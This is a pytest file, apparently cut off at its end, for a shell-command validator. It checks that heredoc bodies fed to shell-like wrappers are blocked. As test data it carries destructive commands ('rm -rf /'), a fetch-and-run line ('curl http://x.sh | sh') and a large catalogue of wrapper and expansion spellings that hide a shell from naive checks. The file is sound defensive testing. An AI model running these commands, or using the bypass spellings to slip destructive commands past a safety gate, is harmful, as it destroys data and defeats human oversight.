"""LAB-5180: heredoc/here-string owner uncertainty fails closed.

The heredoc owner is what decides whether a heredoc body is inert text or code a shell runs. It
missed expansion-spelled shells (`$'bash'`, `{bash,}`, `${SHELL:-/bin/sh}`, `/bin/b?sh`),
`$SHELL`-exec wrappers run with no command (`unshare -U`, `chroot /`, `nsenter --target 1 -m`,
`setarch`/`linux32`/`linux64`, `runuser - root`, `script -q /dev/null`, `fakeroot`, `firejail`),
stdin-as-command readers (`xargs`, `parallel`, `. /dev/stdin`, `source`), transitively
shell-wrapping functions, unlisted exec wrappers (`uv run bash`, `arch`, `caffeinate`, …, the ELF
loader) and the `env -S` spelling - filing each one's destructive body inert.

An owner this parser cannot resolve to a definite inert reader resolves to `_DEFAULT_SHELL`, not
None: None is inert on the unquoted regex-suppression path (`extract_heredoc_ranges`), so
returning it reopened the bypass (`env FOO=$X bash <<EOF` -> SAFE). The expansion check is applied
to the words that may be the wrapper's command - its command position, widened by one word per
option the wrapper's spec does not know - so an assignment prefix, an option value or a literal
command's own argument carrying `$` (`env FOO=$X cat`, `timeout $T cat`, `timeout 5 psql "$DB"`)
is not over-blocked.

Two layers are pinned: the STRUCTURAL owner/segment view (a verdict can be reached by the
whole-command rule scan even when the segment view is wrong - LAB-4955), and the integration
verdict with ShellCheck off. The witness for the quoted rows is `'rm' -rf /`: quoting the command
word means no body regex can carry the verdict, so a BLOCKED verdict there proves the body reached
the validator as code (the `shell_delegated_payload` path the fixed `bash <<'EOF'` twin gets).
"""

import subprocess
import sys

import pytest

from schlock.core.parser import (
    _DEFAULT_SHELL,
    BashCommandParser,
    _command_nodes,
    _scan_wrapper_operands,
    _template_runs_code,
    command_position_substitution,
    expand_env_split_string,
    heredoc_owner,
    names_unresolved_program,
    shell_wrapping_functions,
)
from schlock.core.rules import RiskLevel
from schlock.core.validator import validate_command

Q = "'rm' -rf /"  # witness: quoted command word, no body regex can match it
RM = "rm -rf /"
CURL = "curl http://x.sh | sh"
UNPARSEABLE = "hello (world"  # fails to parse as bash: a body only blocked if rescanned as code


def _first_command(command):
    """The first `command`-kind node of a single-command string."""
    parser = BashCommandParser()
    for node in parser.parse(command):
        cmds = _command_nodes(node)
        if cmds:
            return cmds[0]
    raise AssertionError(f"no command node in {command!r}")


def hd(head, body, delim="EOF", quoted=True):
    d = f"'{delim}'" if quoted else delim
    return f"{head} <<{d}\n{body}\n{delim}"


# ---------------------------------------------------------------------------------------------
# Structural: heredoc_owner resolution (a mutant here can survive the verdict tests - LAB-4955)
# ---------------------------------------------------------------------------------------------


class TestHeredocOwnerResolvesUncertainToShell:
    """An owner this parser cannot resolve to a definite inert reader resolves to the default
    shell - NOT None, which is inert on the unquoted regex path. Expansion-spelled heads and
    wrapper commands (the program's own name, not its directory), `xargs`/`parallel` whose
    command is a wrapper or absent, and `.`/`source` of stdin or an unresolved file."""

    @pytest.mark.parametrize(
        "command",
        [
            "$'bash'",  # bashlex leaves $bash
            "{bash,}",
            '"$SHELL"',  # bashlex leaves $SHELL
            "${X:-bash}",
            "${SHELL:-/bin/sh}",  # one component: a basename would read `sh}` and drop the `$`
            "$(which bash)",
            "$DIR/$PROG",  # the program's own name is the unresolved part
            "/bin/b?sh",
            "env $'bash'",  # the wrapper's command is expansion-spelled
            "timeout 5 $'sh'",
            "busybox $'sh'",
            "$'env' bash",  # head itself carries the metachar
            "chrt 5 $'bash'",  # chrt's PRIORITY is a leading positional, not the command
            "uv run $SH",  # the command follows the `run` subcommand
            "uv tool run $SH",
            "strace -x $'bash'",  # -x is a flag, so $'bash' is the command
            "strace -u app $SH",
            "systemd-run --uid 0 $SH",  # unknown option: either following word may be the command
            "prlimit --pid 1 $SH",
            "env -P /x $SH",
            "xargs env",  # the body supplies env's command
            "xargs -L1 timeout 9",
            "parallel",  # runs each line as a command
            ". /dev/stdin",
            ". /dev/fd/0",
            "source /dev/stdin",
            "source $F",
            ". /dev/fd//0",  # the path is normalised before the stdin test
            ". /dev/fd/./0",
            "source /dev/fd/0/",
            "command . /dev/stdin",  # `command`/`builtin` run the `.` builtin itself
            "builtin source /dev/stdin",
            "command -p . /dev/stdin",
            "command -- source /dev/stdin",
            "builtin $X /dev/stdin",  # the builtin's own name is unresolved
            "${SHELL#)/}",  # the `)` is pattern text: `${` closes only on `}`
            "timeout 5 ${SHELL#)/}",
            "$(: ')'; echo /bin/bash)",  # a quote inside `$(…)`: bracket it no further
            "parallel --jobs 4",  # parallel with no template runs each line; long options too
            "parallel -P 4",
            "parallel --halt now,fail=1",
            "parallel 'sh -c'",  # the template is a shell snippet that runs the line
            "parallel -j4 'sh -c'",
            "parallel 'echo {} | sh'",
        ],
    )
    def test_owner_is_default_shell(self, command):
        assert heredoc_owner(_first_command(command)) == _DEFAULT_SHELL

    def test_no_command_words_is_none(self):
        # The only None case: a command node with no words at all.
        assert heredoc_owner(_first_command("x=1")) is None


class TestHeredocOwnerDefaultShellWrappers:
    """A `$SHELL`-exec wrapper run with no command runs the default shell on its stdin (each row
    verified against the real binary with a `touch` witness). An option the wrapper's spec does
    not know reads as that shell too, so a missing table entry fails closed."""

    @pytest.mark.parametrize(
        "command",
        [
            "unshare -U",
            "unshare -r",
            "unshare --root /",  # long value option: unknown, so the shell
            "unshare -rS 0",  # short cluster: -r flag, -S takes 0
            "chroot /",
            "chroot --userspec 0:0 /",
            "runuser - root",
            "runuser -w -cX root",  # -w takes `-cX` as its value: no -c escape
            "script -q /dev/null",
            "nsenter -t 1 -m",
            "nsenter --target 1 -m",
            "nsenter --setuid 0",  # optional argument on newer util-linux, required on older
            "nsenter -t 1 -m -S 0",
            "setarch x86_64",
            "linux32",
            "linux64",
            "i386",  # setarch personality aliases
            "x86_64",
            "uname26",
            "sg staff",  # sg GROUP with no command runs a shell
            "fakeroot",
            "fakeroot -b 3",  # -b takes a file descriptor
            "firejail",
        ],
    )
    def test_owner_is_default_shell(self, command):
        assert heredoc_owner(_first_command(command)) == _DEFAULT_SHELL


class TestHeredocOwnerResolvesWrappedShell:
    """A wrapper with an explicit shell operand names that shell, wherever the shell sits."""

    @pytest.mark.parametrize(
        "command,expected",
        [
            ("env bash", "bash"),
            ("timeout 5 sh", "sh"),
            ("env FOO=$X bash", "bash"),  # past an assignment carrying $
            ("nice -n $N bash", "bash"),  # past an option value carrying $
            ("/lib64/ld-linux-x86-64.so.2 /bin/bash", "bash"),  # ELF loader
        ],
    )
    def test_owner_names_the_shell(self, command, expected):
        assert heredoc_owner(_first_command(command)) == expected


class TestHeredocOwnerInertReadersUnchanged:
    """Controls: a definite inert reader still names itself, so its body is not rescanned. That
    covers a `$SHELL`-exec wrapper WITH a command, a `-c` escape, an assignment or option value
    carrying `$`, a literal command's own expansion arguments, and a program run from a variable
    directory."""

    @pytest.mark.parametrize(
        "command,expected",
        [
            ("cat", "cat"),
            ("grep foo", "grep"),
            ("tee out.txt", "tee"),
            ("$VENV/bin/python3 -", "python3"),  # the program's name is literal
            ('"$HOME/.venv/bin/python" -', "python"),
            ("timeout 5 cat", "timeout"),
            ("timeout $T cat", "timeout"),  # $T is the DURATION
            ("env FOO=$X cat", "env"),  # the assignment carries the $
            ("env DATABASE_URL=$DB psql", "env"),
            ('timeout 5 psql "$DB"', "timeout"),  # "$DB" is psql's argument, not a command
            ("unshare cat", "unshare"),
            ("unshare -r cat", "unshare"),
            ("unshare -f --kill-child cat", "unshare"),  # --kill-child's argument is optional
            ("chroot / cat", "chroot"),
            ("chroot /mnt tee /etc/fstab", "chroot"),
            ("runuser -u postgres -- psql", "runuser"),  # -u USER: no leading USER positional
            ("runuser -lc psql postgres", "runuser"),  # -c inside the cluster
            ("su root -c id", "su"),
            ("script --command cat f", "script"),
            ("script --command=cat f", "script"),
            ("sg staff cat", "sg"),
            ("xargs -n1 echo", "xargs"),  # echo reads the body lines as arguments
            ('arch -x86_64 psql "$DB"', "arch"),  # macOS architecture names are flags
            ('"$(git rev-parse --show-toplevel)/.venv/bin/python" -', "python"),
            ("${VENV:-.venv}/bin/python -", "python"),
            ('uv run --no-dev psql "$DB"', "uv"),
            ('env --ignore-environment psql "$DB"', "env"),
            ('flock --nonblock /tmp/l psql "$DB"', "flock"),
            ('runuser --user=postgres -- psql "$DB"', "runuser"),  # --user= drops the USER positional
            ("parallel echo", "parallel"),
            ("parallel 'echo {}'", "parallel"),  # inert template: `{}` is echo's argument, not a command
            ("source ./env.sh", "source"),
            ("command . ./env.sh", "."),  # sources a file, not this stdin
            ("command git status", "command"),
            ("builtin echo hi", "builtin"),
            ("bash", "bash"),
            ("/bin/bash", "bash"),
        ],
    )
    def test_owner_is_the_reader(self, command, expected):
        assert heredoc_owner(_first_command(command)) == expected


class TestScanWrapperOperands:
    """The operand scan decides whether stdin runs as code. Only ``runs_code`` is pinned: the
    candidate window is an over-read by design, and a correct future tightening must not break
    these. Rows the owner tables above already reach are not repeated here."""

    @pytest.mark.parametrize(
        "base,operands,runs_code",
        [
            ("unshare", ["--frobnicate", "cat"], True),  # unknown option on a shell-exec wrapper
            ("nsenter", ["-t", "1", "cat"], False),
            ("setarch", ["x86_64", "-R", "cat"], False),  # options after ARCH
            ("runuser", ["-", "root", "cat"], False),
            ("runuser", ["root", "-c", "id"], False),  # -c after the user (su-style getopt)
            ("runuser", ["-lu", "postgres", "--", "psql", "$DB"], False),  # -u inside a cluster
            ("su", ["root"], True),
            ("su", ["root", "cat"], False),
            ("sg", ["staff", "-c", "cat"], False),
            ("script", ["-c", "id", "/dev/null"], False),
            ("fakeroot", ["cat"], False),
            ("timeout", ["5"], False),  # not a $SHELL-exec wrapper: runs nothing
            ("timeout", ["5", "cat", "-"], False),  # `-` after the command is its operand
            ("sudo", ["-u", "postgres", "psql", "$DB"], False),
            ("env", ["FOO=1", "cat"], False),
            ("env", ["FOO=1"], False),
            ("env", ["--ignore-environment", "$SH"], True),
            ("flock", ["--nonblock", "lockfile", "$SH"], True),
            ("uv", ["run", "pytest", "-k", "exec"], False),
            ("uv", ["run", "--no-dev", "$SH"], True),
            ("uv", ["pip", "install", "x"], False),  # no `run`: uv runs nothing
            ("strace", ["-f", "cat", "$F"], False),
            ("arch", ["-arm64", "python3", "$F"], False),
            ("parallel", ["--frobnicate"], True),  # unknown option on a shell_exec wrapper
            ("parallel", ["-i", "echo"], True),  # optional-argument -i is unlisted -> unknown -> shell
            ("parallel", ["--max-lines", "$SH", "cat"], True),  # optional-argument --max-lines likewise
            ("parallel", ["--jobs", "4", "gzip", "-9"], False),  # required-arg --jobs; gzip template inert
            ("parallel", ["eval", "{}"], True),  # eval is not an inert reader
            ("parallel", ["{}"], True),  # the line itself is the command
            ("parallel", ["env"], True),  # the line becomes env's command
            ("parallel", ["echo", ":::", "a"], False),  # arguments come from :::, not stdin
            ("parallel", [":::", "a"], True),  # no template: read as the shell
            ("parallel", ["parallel", "echo"], True),  # a nested runner is not an inert reader
        ],
    )
    def test_scan(self, base, operands, runs_code):
        assert _scan_wrapper_operands(base, operands)[1] is runs_code


class TestNamesUnresolvedProgram:
    """The program's own name is the last path component outside `${…}`, `$(…)` and backticks; a
    word the bracket scan cannot read for certain is unresolved as a whole."""

    @pytest.mark.parametrize(
        "word,unresolved",
        [
            ("$VENV/bin/python3", False),
            ("$(pwd)/bin/tool", False),
            ("${VENV:-.venv}/bin/python", False),
            ("${SHELL:-/bin/sh}", True),
            ("${SHELL#)/}", True),  # mismatched closer inside `${…}` is pattern text
            ("$(: ')'; echo /bin/bash)", True),  # quote inside `$(…)`
            ("`echo /bin/sh`", True),
            ("${SHELL", True),  # opener never closed
            ("a)b/$SH", True),  # closer with nothing open
            ("$DIR/$PROG", True),
        ],
    )
    def test_predicate(self, word, unresolved):
        assert names_unresolved_program(word) is unresolved


class TestEnvSplitStringExpansion:
    @pytest.mark.parametrize(
        "args,expected",
        [
            (["-S", "bash -e"], ["bash", "-e"]),
            (["-Sbash"], ["bash"]),
            (["--split-string=bash -c foo"], ["bash", "-c", "foo"]),
            (["FOO=1", "bash"], ["FOO=1", "bash"]),  # untouched without -S
        ],
    )
    def test_env_expansion(self, args, expected):
        assert expand_env_split_string("env", args) == expected

    def test_non_env_untouched(self):
        assert expand_env_split_string("timeout", ["-S", "bash -e"]) == ["-S", "bash -e"]


class TestShellWrappingFunctions:
    @pytest.mark.parametrize(
        "command,expected",
        [
            ("f() { bash; }; f", {"f"}),
            ("g() { unshare -U; }; g", {"g"}),  # runs the default shell
            ("h() { cat; }; h", set()),  # inert body
            ("cat file", set()),  # no function
            ("g() { bash; }; f() { g; }; f", {"g", "f"}),  # transitive
            ("f() { g; }; g() { bash; }; f", {"g", "f"}),  # a forward call: declaration order is irrelevant
            ("f() { f; }; f", set()),  # a self-recursive function terminates and wraps nothing
        ],
    )
    def test_detects_shell_wrapping_functions(self, command, expected):
        parser = BashCommandParser()
        assert shell_wrapping_functions(parser.parse(command)) == expected


class TestCommandPositionSubstitution:
    """A command substitution whose OUTPUT is executed is in command position; an assignment RHS or
    an argument is not. Pins the node found, not just its presence."""

    def _sub(self, command):
        return command_position_substitution(_first_command(command))

    @pytest.mark.parametrize("command", ["$(cat file)", "`cat file`", "$(cat file) arg"])
    def test_command_position_returns_the_sub_node(self, command):
        sub = self._sub(command)
        assert sub is not None and getattr(sub, "kind", None) == "commandsubstitution"

    @pytest.mark.parametrize("command", ["x=$(cat file)", "echo $(cat file)", 'git commit -m "$(cat file)"'])
    def test_non_command_position_is_none(self, command):
        assert self._sub(command) is None


class TestProcsubHeredocRangesAreShell:
    """A heredoc under an unquoted process substitution is is_shell=True in extract_heredoc_ranges
    - the reader of `<( … )` may run what it prints. Pinned structurally: the whole-command scan
    would block these anyway, masking a regression in the range view (LAB-4955)."""

    @pytest.mark.parametrize(
        "command",
        [
            "bash <(cat <<EOF\nrm -rf /\nEOF\n)",
            "source <(cat <<EOF\nrm -rf /\nEOF\n)",
            ". <(cat <<EOF\nrm -rf /\nEOF\n)",
            "bash <(cat <<EOF\nrm -rf /\nEOF\n) | wc -l",
            # A command-position substitution runs its output; a shell-wrapping function its stdin.
            "$(cat <<EOF\nrm -rf /\nEOF\n)",
            "`cat <<EOF\nrm -rf /\nEOF\n`",
            "f() { bash; }; f <<EOF\nrm -rf /\nEOF",
            "g() { bash; }; f() { g; }; f <<EOF\nrm -rf /\nEOF",
            "command . /dev/stdin <<EOF\nrm -rf /\nEOF",
        ],
    )
    def test_procsub_heredoc_is_shell(self, command):
        parser = BashCommandParser()
        ranges = parser.extract_heredoc_ranges(command, parser.parse(command))
        assert ranges, f"no heredoc range for {command!r}"
        assert all(is_shell for _s, _e, is_shell in ranges), ranges

    @pytest.mark.parametrize(
        "command",
        [
            "x=$(cat <<EOF\nrm -rf /\nEOF\n)",  # assignment: data
            'echo "$(cat <<EOF\nrm -rf /\nEOF\n)"',  # argument: data
            "f() { cat; }; f <<EOF\nrm -rf /\nEOF",  # the function reads, it does not run
        ],
    )
    def test_data_heredoc_is_not_shell(self, command):
        parser = BashCommandParser()
        ranges = parser.extract_heredoc_ranges(command, parser.parse(command))
        assert ranges, f"no heredoc range for {command!r}"
        assert not any(is_shell for _s, _e, is_shell in ranges), ranges


class TestBusyboxPathShellHereString:
    """AC3: `_classify_sink` basenames the resolved multicall applet, so `busybox /bin/sh <<< X`
    surfaces the same stdin program as `busybox sh <<< X`."""

    def _extract(self, command):
        parser = BashCommandParser()
        return parser.extract_stdin_program_redirects(parser.parse(command))

    def test_busybox_path_shell_resolves_to_applet(self):
        assert self._extract('busybox /bin/sh <<< "rm -rf /"') == [("sh", "rm -rf /")]

    def test_busybox_bare_applet_still_resolves(self):
        assert self._extract('busybox sh <<< "rm -rf /"') == [("sh", "rm -rf /")]


# ---------------------------------------------------------------------------------------------
# Integration verdicts (ShellCheck off). Quoted rows must reach shell_delegated_payload.
# ---------------------------------------------------------------------------------------------

AC1_QUOTED_ROWS = [
    "$'bash'",
    "{bash,}",
    '"$SHELL"',
    "${X:-bash}",
    "${SHELL:-/bin/sh}",
    "/bin/b?sh",
    "env $'bash'",
    "timeout 5 $'sh'",
    "busybox $'sh'",
    "$'env' bash",
    "env FOO=$X bash",  # an assignment carrying $ must not hide the shell
    "unshare -U",
    "unshare -r",
    "unshare --root /",
    "unshare -rS 0",
    "chroot /",
    "chroot --userspec 0:0 /",
    "runuser - root",
    "script -q /dev/null",
    "nsenter -t 1 -m",
    "nsenter --target 1 -m",
    "setarch x86_64",
    "linux32",
    "linux64",
    "fakeroot",
    "firejail",
    "xargs env",
    "xargs -L1 timeout 9",
    "parallel",
    "uv run bash",
    "fakeroot bash",
    "firejail bash",
    "arch -x86_64 bash",
    "caffeinate bash",
    "prlimit bash",
    "dbus-run-session bash",
    "/lib64/ld-linux-x86-64.so.2 /bin/bash",
    ". /dev/stdin",
    "source /dev/stdin",
    "env -S 'bash -e'",
    "env -Sbash",
    "env --split-string=bash",
    # Operand-scan spellings: a table gap, a leading positional or a subcommand must not hide the command.
    "chrt 5 $'bash'",
    "uv run $SH",
    "uv tool run $SH",
    "strace -x $'bash'",
    "strace -u app $SH",
    "systemd-run --uid 0 $SH",
    "prlimit --pid 1 $SH",
    "env -P /x $SH",
    "$(which bash)",
    "$DIR/$PROG",
    "nsenter --setuid 0",
    "nsenter -t 1 -m -S 0",
    "fakeroot -b 3",
    "runuser -w -cX root",
    "sg staff",
    "x86_64",
    "i386",
    ". /dev/fd/0",
    "source $F",
    "parallel --jobs 4",
    "parallel -P 4",
    "parallel --halt now,fail=1",
    "parallel --timeout 10",
    "parallel --retries 3",
    "parallel 'sh -c'",
    "parallel -j4 'sh -c'",
    "parallel --max-lines $SH cat",
    "parallel --pipe sort -S16k --compress-program=sh",  # sort runs the compress program
    "parallel printf %s {}",  # printf dropped from the inert set (printf -v runs code)
    "parallel -i echo",
    "parallel -e echo",
    "parallel --replace echo",
    "parallel 'eval {}'",
    "parallel 'trap {} EXIT'",
    "parallel 'echo {} > >(sh)'",
    "${SHELL#)/}",
    "timeout 5 ${SHELL#)/}",
    "env ${SHELL#)/}",
    "nohup ${SHELL#)/}",
    "$(: ')'; echo /bin/bash)",
    ". /dev/fd//0",
    ". /dev/fd/./0",
    "source /dev/fd/0/",
    "command . /dev/stdin",
    "builtin source /dev/stdin",
    "command -p . /dev/stdin",
]


class TestAc1QuotedHeredocRowsBlocked:
    @pytest.mark.parametrize("head", AC1_QUOTED_ROWS)
    def test_quoted_heredoc_blocked_structurally(self, head, no_shellcheck):
        result = validate_command(hd(head, Q))
        assert result.risk_level == RiskLevel.BLOCKED, f"{head!r} -> {result.risk_level.name}"
        # The verdict comes from the structural path, not a body regex (the body is quote-broken).
        rules = result.matched_rules or []
        assert "shell_delegated_payload" in rules or "Cannot" in (result.message or ""), (head, rules, result.message)
        assert "system_destruction" not in rules and "recursive_delete" not in rules, (head, rules)

    @pytest.mark.parametrize(
        "command",
        [
            "f() { bash; }; " + hd("f", Q),  # direct wrapping function
            "g() { bash; }; f() { g; }; " + hd("f", Q),  # transitive
        ],
    )
    def test_shell_wrapping_function_blocked(self, command, no_shellcheck):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_direct_twin_is_the_floor(self, no_shellcheck):
        twin = validate_command(hd("bash", Q))
        assert twin.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (twin.matched_rules or [])


class TestAc1UnquotedRegressionTwins:
    """A None owner is inert on the unquoted path, so an uncertain owner must resolve to a shell:
    over an UNQUOTED `rm -rf /` body each row reaches the direct `bash <<EOF` twin's BLOCKED."""

    @pytest.mark.parametrize(
        "head",
        [
            "env FOO=$X bash",
            'timeout "${T:-5}" bash',
            "nice -n $N bash",
            'stdbuf -o"$M" bash',
            "$'bash'",
            "xargs env",
            ". /dev/stdin",
            "source /dev/stdin",
            "command . /dev/stdin",
            "builtin source /dev/stdin",
        ],
    )
    def test_unquoted_twin_blocked(self, head, no_shellcheck):
        result = validate_command(hd(head, RM, quoted=False))
        assert result.risk_level == RiskLevel.BLOCKED, f"{head!r} -> {result.risk_level.name}"


class TestAc2DashCPayloads:
    @pytest.mark.parametrize(
        "command",
        [
            "env $'bash' -c 'rm -rf /'",
            "env -S 'bash -c \"rm -rf /\"'",
            f'/lib64/ld-linux-x86-64.so.2 /bin/bash -c "{Q}"',  # the loader is a wrapper here too
        ],
    )
    def test_dash_c_payload_blocked(self, command, no_shellcheck):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert "shell_delegated_payload" in (result.matched_rules or [])

    @pytest.mark.parametrize(
        "command",
        [
            "timeout $T python3 -c 'print(1)'",  # -c belongs to python3, not the unresolved word
            "env DATABASE_URL=$DB psql -c 'select 1'",
        ],
    )
    def test_dash_c_of_another_program_not_extracted(self, command, no_shellcheck):
        # SAFE on a72b45c: the -c belongs to the literal program, so nothing is delegated.
        assert validate_command(command).risk_level == RiskLevel.SAFE, command


class TestAc3HereStringDrift:
    @pytest.mark.parametrize("body", [RM, Q])
    def test_busybox_path_shell_matches_bash(self, body, no_shellcheck):
        busybox = validate_command(f'busybox /bin/sh <<< "{body}"')
        bash = validate_command(f'bash <<< "{body}"')
        assert busybox.risk_level == bash.risk_level == RiskLevel.BLOCKED, (body, busybox.risk_level, bash.risk_level)

    def test_loader_shell_matches_bash(self, no_shellcheck):
        result = validate_command(f'/lib64/ld-linux-x86-64.so.2 /bin/bash <<< "{Q}"')
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_loader_reader_stays_inert(self, no_shellcheck):
        assert validate_command(f'/lib64/ld-linux-x86-64.so.2 /bin/cat <<< "{Q}"').risk_level == RiskLevel.SAFE


class TestAc4UnquotedRowsMatchDirectTwin:
    """Parity with the direct unquoted twin `bash <<EOF` (regex over the raw body); structural
    validation of unquoted bodies is out of scope."""

    @pytest.mark.parametrize(
        "command",
        [
            "bash <(cat <<EOF\n{body}\nEOF\n)",
            "source <(cat <<EOF\n{body}\nEOF\n)",
            ". <(cat <<EOF\n{body}\nEOF\n)",
            "unshare <<EOF\n{body}\nEOF",
            "chroot / <<EOF\n{body}\nEOF",
            "script -q /dev/null <<EOF\n{body}\nEOF",
            "$(cat <<EOF\n{body}\nEOF\n)",  # command position: its output runs
            "`cat <<EOF\n{body}\nEOF\n`",
            "f() {{ bash; }}; f <<EOF\n{body}\nEOF",
        ],
    )
    @pytest.mark.parametrize("body", [RM, CURL])
    def test_unquoted_row_blocked(self, command, body, no_shellcheck):
        result = validate_command(command.format(body=body))
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r}/{body!r} -> {result.risk_level.name}"


class TestAc5CommandPosition:
    def test_command_position_dollar_blocked(self, no_shellcheck):
        result = validate_command("$(cat <<'EOF'\n" + Q + "\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_command_position_backtick_blocked(self, no_shellcheck):
        result = validate_command("`cat <<'EOF'\n" + Q + "\nEOF\n`")
        assert result.risk_level == RiskLevel.BLOCKED
        assert "shell_delegated_payload" in (result.matched_rules or [])

    def test_assignment_rhs_keeps_verdict(self, no_shellcheck):
        # Data, not a command: stays SAFE (its a72b45c verdict).
        result = validate_command("x=$(cat <<'EOF'\n" + Q + "\nEOF\n)")
        assert result.risk_level == RiskLevel.SAFE

    def test_commit_message_argument_keeps_verdict(self, no_shellcheck):
        # `git commit -m "$(...)"` took the fallback pre-change and stays BLOCKED there.
        result = validate_command("git commit -m \"$(cat <<'EOF'\n" + Q + '\nEOF\n)"')
        assert result.risk_level == RiskLevel.BLOCKED


class TestAc6OverBlockGuidance:
    def test_git_commit_file_procsub_points_at_stdin(self, no_shellcheck):
        result = validate_command("git commit -F <(cat <<'EOF'\nfix: it's done\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert any("-F -" in alt for alt in result.alternatives), result.alternatives

    def test_gh_body_file_procsub_points_at_stdin(self, no_shellcheck):
        result = validate_command("gh pr create --body-file <(cat <<'EOF'\nDoesn't break\nEOF\n)")
        assert result.risk_level == RiskLevel.BLOCKED
        assert any("--body-file -" in alt for alt in result.alternatives), result.alternatives

    def test_stdin_spellings_keep_verdicts(self, no_shellcheck):
        # `-F -` / `--body-file -` are allowed; the guidance points here.
        assert validate_command("git commit -F - <<'EOF'\nfix: it's done\nEOF").allowed is True
        assert validate_command("gh pr create --body-file - <<'EOF'\nDoesn't break\nEOF").allowed is True


class TestAc7InertControlsUnchanged:
    """Benign bodies stay allowed; a `$SHELL`-exec wrapper WITH a command operand does not rescan
    its body as a program. The body `hello (world` fails to parse as bash, so a wrongly-rescanned
    body would BLOCK - the test really pins "not rescanned as code", not "the body is harmless"."""

    @pytest.mark.parametrize(
        "command,risk",
        [
            ("cat", RiskLevel.SAFE),
            ("grep foo", RiskLevel.SAFE),
            ("timeout 5 cat", RiskLevel.SAFE),
            ("timeout $T cat", RiskLevel.SAFE),
            ("env FOO=$X cat", RiskLevel.SAFE),
            ("unshare cat", RiskLevel.SAFE),
            ("unshare -r cat", RiskLevel.SAFE),
            ("chroot / cat", RiskLevel.SAFE),
            ("tee out.txt", RiskLevel.HIGH),  # file_truncation, but allowed
            ("chroot /mnt tee /etc/fstab", RiskLevel.HIGH),
        ],
    )
    def test_benign_body_stays_allowed(self, command, risk, no_shellcheck):
        result = validate_command(hd(command, UNPARSEABLE))
        assert result.risk_level == risk, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is True


class TestLauncherExecEvalNotBypassScanned:
    """Launchers whose own subcommand is `exec`/`eval` are out of the wrapper-bypass scan,
    so a benign `uv run … exec` / `firejail … eval` is not read as the shell builtin."""

    @pytest.mark.parametrize("command", ["uv run pytest -k exec", "firejail --noprofile make eval"])
    def test_launcher_subcommand_not_blocked(self, command, no_shellcheck):
        assert validate_command(command).risk_level != RiskLevel.BLOCKED, command


PY = "import os\nprint(os.getcwd())"
SQL = "INSERT INTO t (a, b) VALUES (1, 'x');"


class TestOwnerDoesNotOverRead:
    """Each row is SAFE on a72b45c and must stay SAFE: a program run from a variable directory, a
    literal command's own expansion argument, a `-c` inside a cluster or in `--command=` form, an
    optional-argument option, `runuser -u USER CMD`, `xargs` with a literal command and sourcing a
    named file are all definite inert readers. Each body fails to parse as bash, so a row that
    wrongly reads its owner as a shell BLOCKS."""

    @pytest.mark.parametrize(
        "command",
        [
            hd('"$HOME/.venv/bin/python" -', PY),
            hd("$VENV/bin/python3 -", PY),
            hd("$HOME/bin/psql", SQL),
            hd('timeout 5 psql "$DB"', SQL),
            hd('timeout 5 grep "$PAT"', UNPARSEABLE),
            hd('env FOO=1 cat "$f"', UNPARSEABLE),
            hd("runuser -u postgres -- psql", SQL),
            hd("runuser -lc psql postgres", SQL),
            hd("script --command cat f", UNPARSEABLE),
            hd("script --command=cat f", UNPARSEABLE),
            hd("unshare -f --kill-child cat", UNPARSEABLE),
            hd("xargs -n1 echo", UNPARSEABLE),
            hd("source ./env.sh", UNPARSEABLE),
            hd('uv run --no-dev psql "$DB"', SQL),
            hd('uv run --all-extras psql "$DB"', SQL),
            hd('uv run --script x.py "$ARG"', PY),
            hd('env --ignore-environment psql "$DB"', SQL),
            hd('flock --nonblock /tmp/l psql "$DB"', SQL),
            hd('runuser --user=postgres -- psql "$DB"', SQL),
            hd('runuser -lu postgres -- psql "$DB"', SQL),
            hd("parallel 'echo {}'", UNPARSEABLE),
            hd("parallel -j4 echo", UNPARSEABLE),
            hd('"$(git rev-parse --show-toplevel)/.venv/bin/python" -', PY),
            hd("${VENV:-.venv}/bin/python -", PY),
            'script -q "-cls -la" /dev/null',
            "script -Tclock.log echo /dev/null",  # -T takes clock.log; echo is the command
            hd('"$(dirname "$0")/run.sh"', "hello world"),  # a clean body run from a $()-quoted path
            "runuser -s/bin/csh root -c 'ls -la'",
        ],
    )
    def test_inert_reader_keeps_base_verdict(self, command, no_shellcheck):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name} {result.matched_rules}"

    @pytest.mark.parametrize(
        "command",
        [
            "script -q --command \"'rm' -rf /\" /dev/null",  # SAFE on a72b45c: --command was skipped
            "script -q -c \"'rm' -rf /\" /dev/null",  # the short twin, BLOCKED on a72b45c too
            "script -q \"-c'rm' -rf /\" /dev/null",  # SAFE on a72b45c: the attached program was skipped
            # The runner's grammar picks the `-c`: a value option's `c` is not it (SAFE on a72b45c).
            "runuser -s/bin/csh root -c \"'rm' -rf /\"",
            "runuser -gcdrom root -c \"'rm' -rf /\"",
            "script -Tclock.log -c \"'rm' -rf /\" /dev/null",
            "runuser -w -cfoo -c \"'rm' -rf /\" root",  # -w takes `-cfoo` as its value
            "script -T -cfoo -c \"'rm' -rf /\" /dev/null",
            "runuser -gdocker -c \"'rm' -rf /\" root",  # the `c` in `docker` is -g's value, not -c
        ],
    )
    def test_long_command_payload_is_delegated(self, command, no_shellcheck):
        # `--command PROG` and an attached `-cPROG` are the same delegation as `-c PROG`.
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, command
        assert "shell_delegated_payload" in (result.matched_rules or [])


class TestTemplateRunsCode:
    """GNU parallel's command template runs its appended input line through `$SHELL`. The
    classifier is an allowlist, not a parse (a re-parse reopened an unfixed infinite loop): a
    metacharacter, an unsplittable template, or a first word that is not a known inert reader is
    code. Never put an executor (eval, awk, find, a shell) in the inert set."""

    @pytest.mark.parametrize(
        "template,runs_code",
        [
            (["eval {}"], True),
            (['eval "$(cat)"'], True),
            (["builtin eval {}"], True),
            (["command eval {}"], True),
            (["trap {} EXIT"], True),
            (["echo {} > >(sh)"], True),
